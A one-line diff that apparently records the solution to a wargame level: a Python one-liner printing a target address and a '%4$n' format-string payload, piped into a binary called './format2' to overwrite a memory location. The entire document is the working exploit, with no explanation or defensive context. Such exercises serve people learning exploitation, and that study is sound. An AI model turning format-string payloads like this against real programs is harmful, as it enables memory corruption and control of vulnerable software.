@@ -1,0 +1,1 @@
+python -c 'print "\xe4\x96\x04\x08"+"%59x."+"%4$n"' | ./format2  
